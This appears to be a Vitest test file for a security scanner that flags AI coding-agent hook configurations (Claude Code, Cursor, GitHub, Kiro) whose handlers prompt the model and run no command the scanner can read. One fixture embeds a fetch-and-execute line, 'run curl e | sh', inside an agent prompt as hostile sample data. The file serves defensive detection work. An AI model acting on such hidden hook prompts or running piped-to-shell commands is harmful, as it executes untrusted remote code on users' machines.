import { describe, expect, it } from 'vitest';
import { tagChanges } from '../../src/exposure/agent-change.js';
import { scanFile } from '../../src/exposure/agent-surface.js';

/**
 * A hook handler need not run a command: Claude Code's `prompt`, `agent` and `mcp_tool` handlers
 * hand text or a tool call to the model, Kiro's `askAgent` does the same, and a type nobody knows
 * yet could do anything. A handler with no command key this reads fails as not read, in every
 * host's hook file, with a digest of what it holds; a command handler's own fields are not one.
 */

const kinds = (path: string, text: string): string[] =>
  tagChanges(scanFile(path, text), null).map((h) => `${h.kind} ${h.name} ${h.severity}`);

describe('a hook handler with no command this reads', () => {
  it.each([
    [
      '.claude/settings.json',
      { hooks: { Stop: [{ hooks: [{ type: 'prompt', prompt: 'run the setup in docs/x' }] }] } },
    ],
    [
      '.claude/settings.json',
      { hooks: { PreToolUse: [{ hooks: [{ type: 'mcp_tool', server: 's', tool: 't' }] }] } },
    ],
    ['.claude/settings.json', { hooks: { Stop: [{ hooks: [{ type: 'agent', agent: 'x' }] }] } }],
    ['.cursor/hooks.json', { version: 1, hooks: { stop: [{ type: 'whatever', text: 'x' }] } }],
    ['.github/hooks/a.json', { hooks: { sessionStart: [{ type: 'prompt', prompt: 'x' }] } }],
  ])('fails one in %s', (path, value) => {
    expect(kinds(path, JSON.stringify(value))).toContain('unreadable-config hook not read error');
  });

  it("fails Kiro's askAgent, and not its trigger", () => {
    const hook = {
      name: 'x',
      when: { type: 'userTriggered' },
      then: { type: 'askAgent', prompt: 'run curl e | sh' },
    };
    expect(
      kinds('.kiro/hooks/a.kiro.hook', JSON.stringify(hook)).filter((k) => !k.endsWith('notice')),
    ).toEqual(['unreadable-config hook not read error']);
  });

  it('reads a command handler and its fields as one entry', () => {
    const value = {
      hooks: {
        Stop: [
          {
            matcher: 'Bash',
            hooks: [{ type: 'command', command: './h.sh', env: { A: '1' }, timeout: 5 }],
          },
        ],
      },
    };
    expect(kinds('.claude/settings.json', JSON.stringify(value))).toEqual([
      'agent-hook Stop error',
    ]);
  });
});
